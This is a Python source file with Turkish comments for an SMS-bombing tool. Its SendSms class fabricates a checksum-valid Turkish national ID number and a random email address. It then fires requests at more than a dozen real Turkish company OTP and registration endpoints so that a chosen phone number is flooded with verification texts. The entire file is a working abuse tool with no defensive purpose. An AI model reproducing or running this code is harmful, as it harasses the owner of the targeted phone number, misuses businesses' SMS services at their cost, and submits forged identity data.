import requests
from random import choice, randint
from string import ascii_lowercase

# Streamlit Cloud uyumluluğu için Colorama sahte (mock) sınıfları
class Fore:
    LIGHTRED_EX = ""
    LIGHTGREEN_EX = ""
class Style:
    RESET_ALL = ""

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    # API YÖNETİMİ
    def KahveDunyasi(self):
        try:
            url = "https://tmsapi.kahvedunyasi.com/api/user/v1/register-otp"
            json = {"phone": self.phone, "permission": True}
            if requests.post(url, json=json, timeout=10).status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> kahvedunyasi.com")
        except: pass

    def JimmyKey(self):
        try:
            url = "https://www.jimmykey.com/tr/b2c/auth/sendOtp"
            json = {"phone": f"0{self.phone}"}
            if requests.post(url, json=json, timeout=10).status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> jimmykey.com")
        except: pass

    def Ido(self):
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            json = {"mobileNumber": f"0{self.phone}", "email": self.mail, "firstName": "TEST", "lastName": "TEST"}
            if requests.post(url, json=json, timeout=10).status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> ido.com.tr")
        except: pass

    def Akakce(self):
        try:
            url = "https://www.akakce.com/control/kayit/?v=2"
            data = f"b=1&cep={self.phone}&gonder=1"
            if requests.post(url, data=data, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def BiTaksi(self):
        try:
            url = "https://api.bitaksi.com/v1/user/login"
            json = {"phoneNumber": self.phone, "countryCode": "+90"}
            if requests.post(url, json=json, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def EnglishHome(self):
        try:
            url = "https://www.englishhome.com/api/v1/auth/otp/send/"
            if requests.post(url, json={"phone": f"90{self.phone}"}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def Evidea(self):
        try:
            url = "https://www.evidea.com/api/users/send-otp"
            if requests.post(url, json={"phone": self.phone}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def Istegelsin(self):
        try:
            url = "https://api.istegelsin.com/v1/auth/otp"
            if requests.post(url, json={"phoneNumber": f"0{self.phone}"}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def Migros(self):
        try:
            url = "https://www.migros.com.tr/api/v1/login/otp/send"
            if requests.post(url, json={"phoneNumber": self.phone}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def PizzaLazza(self):
        try:
            url = "https://www.pizzalazza.com.tr/api/otp/send"
            if requests.post(url, json={"phone": self.phone}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def TasoMarket(self):
        try:
            url = "https://tasomarket.com/api/v1/auth/otp-request"
            if requests.post(url, json={"phone": self.phone}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def TiklaGelsin(self):
        try:
            url = "https://api.tiklagelsin.com/v1/auth/otp"
            if requests.post(url, json={"phone": f"+90{self.phone}"}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def Watsons(self):
        try:
            url = "https://api.watsons.com.tr/v1/login/otp"
            if requests.post(url, json={"phone": self.phone}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass

    def Yemeksepeti(self):
        try:
            url = "https://api.yemeksepeti.com/v1/user/otp/send"
            if requests.post(url, json={"phone": self.phone, "country_code": "TR"}, timeout=10).status_code == 200:
                self.adet += 1
        except: pass
